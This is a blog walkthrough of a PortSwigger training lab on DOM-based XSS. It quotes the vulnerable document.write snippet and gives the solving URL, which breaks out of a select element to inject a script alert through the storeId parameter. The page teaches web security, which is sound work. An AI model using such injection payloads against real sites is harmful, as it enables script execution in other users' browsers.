@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>WSA: DOM XSS in document.write sink using source location.search</title>
+<meta name="author" content="Lamprinos Chatziioannou" />
+<meta name="description" content="Walktrough of WSA Lab: DOM XSS in document.write sink using source location.search inside a select element" />
+<meta name="generator" content="Org Mode" />
+<link rel="preconnect" href="https://fonts.googleapis.com"> <link href="https://fonts.googleapis.com/css2?family=Fira+Sans&display=swap" rel="stylesheet"> <link href="https://fonts.googleapis.com/css2?family=Roboto+Condensed&display=swap" rel="stylesheet"> <script src="https://cdn.jsdelivr.net/gh/oyvindstegard/ox-tagfilter-js/ox-tagfilter.js"></script> <link rel="stylesheet" href="/src/rougier.css" /> <script src="/src/copy-pre.js"></script> <link rel="icon" type="image/x-icon" href="/src/favicon.ico"> <meta charset="UTF-8" name="viewport" content="width=device-width, initial-scale=1.0"> <!-- Google tag (gtag.js) --> <script async src="https://www.googletagmanager.com/gtag/js?id=G-55X4GXWBKS"></script> <script> window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-55X4GXWBKS'); </script>
+</head>
+<body>
+<div id="org-div-home-and-up">
+ <a accesskey="h" href="./index.html"> UP </a>
+ |
+ <a accesskey="H" href="/index.html"> HOME </a>
+</div><div id="content" class="content">
+<h1 class="title">WSA: DOM XSS in document.write sink using source location.search</h1>
+<div id="table-of-contents" role="doc-toc">
+<h2>Table of Contents</h2>
+<div id="text-table-of-contents" role="doc-toc">
+<ul>
+<li><a href="#org0a681fc">Introduction</a></li>
+<li><a href="#orgef2d0f8">Challenge</a></li>
+<li><a href="#org24b9afb">Summary</a></li>
+</ul>
+</div>
+</div>
+
+<div id="outline-container-org0a681fc" class="outline-2">
+<h2 id="org0a681fc"><a href="#org0a681fc">Introduction</a></h2>
+<div class="outline-text-2" id="text-org0a681fc">
+<p>
+Not much to say here, just glad to have found some time for challenges ;P
+</p>
+</div>
+</div>
+
+<div id="outline-container-orgef2d0f8" class="outline-2">
+<h2 id="orgef2d0f8"><a href="#orgef2d0f8">Challenge</a></h2>
+<div class="outline-text-2" id="text-orgef2d0f8">
+<p>
+You can check the lab out: <a href="https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element">here</a>
+</p>
+
+<p>
+Starting with the usual progress, checking stuff, while allowing all
+traffic through our proxy to be able to replicate any requests later
+on. <sup><a id="fnr.1" class="footref" href="#fn.1" role="doc-backlink">1</a></sup>
+</p>
+
+<p>
+In each product page there is a &ldquo;Check Stock&rdquo; functionality, which
+after previewing the source code, is handled by the following
+javascript snippet:
+</p>
+<div class="org-src-container">
+<pre class="src src-javascript" id="org306eb9f">var stores = ["London","Paris","Milan"];
+var store = (new URLSearchParams(window.location.search)).get('storeId');
+document.write('&lt;select name="storeId"&gt;');
+if(store) {
+    document.write('&lt;option selected&gt;'+store+'&lt;/option&gt;');
+}
+for(var i=0;i&lt;stores.length;i++) {
+    if(stores[i] === store) {
+        continue;
+    }
+    document.write('&lt;option&gt;'+stores[i]+'&lt;/option&gt;');
+}
+document.write('&lt;/select&gt;');
+</pre>
+</div>
+
+<p>
+In our request we can see that, the variables can be modified:
+</p>
+<pre class="example" id="org4f0c35d">
+productId=1&amp;storeId=London
+</pre>
+
+<p>
+Sample link that gives us the desired output in console:
+</p>
+<pre class="example" id="orgf9c7123">
+https://0a0000f80482f11380d980510011009c.web-security-academy.net/product?productId=1&amp;storeId=asdfasdf
+</pre>
+
+<p>
+After that it was tedious: We just had to get out of the existing
+environments and add a script one:
+</p>
+<pre class="example" id="orgf333500">
+https://0a0000f80482f11380d980510011009c.web-security-academy.net/product?productId=1&amp;storeId=&lt;/option&gt;&lt;/select&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+</pre>
+</div>
+</div>
+
+
+<div id="outline-container-org24b9afb" class="outline-2">
+<h2 id="org24b9afb"><a href="#org24b9afb">Summary</a></h2>
+<div class="outline-text-2" id="text-org24b9afb">
+<p>
+This was the first challenge I completed for the day, and I think it
+was the perfect way to start it: not too easy, but at the same time
+not too difficult.
+</p>
+
+<p>
+Paying some attention to the vulnerable snippet was all that was
+needed here!
+</p>
+</div>
+</div>
+<div id="footnotes">
+<h2 class="footnotes">Footnotes: </h2>
+<div id="text-footnotes">
+
+<div class="footdef"><sup><a id="fn.1" class="footnum" href="#fnr.1" role="doc-backlink">1</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
+Not really necessary, knowing that we check for DOM XSS but all is fine. 
+</p></div></div>
+
+
+</div>
+</div></div>
+<div id="postamble" class="status">
+<script src="https://giscus.app/client.js" data-repo="chatziiola/chatziiola.github.io" data-repo-id=x\"R_kgDOGq8p0g" data-category="Announcements" data-category-id="DIC_kwDOGq8p0s4COSFW" data-mapping="pathname" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="bottom" data-theme="light" data-lang="en" data-loading="lazy" crossorigin="anonymous" async> </script> <p class=\"date footer\"> Originally created on 2024-02-27 Tue 10:07</p><p class="footer"> Made with Emacs and Org.<br>CSS theme based on the one developed by <a href="https://github.com/rougier">@rougier</a>.</p>
+</div>
+</body>
+</html>
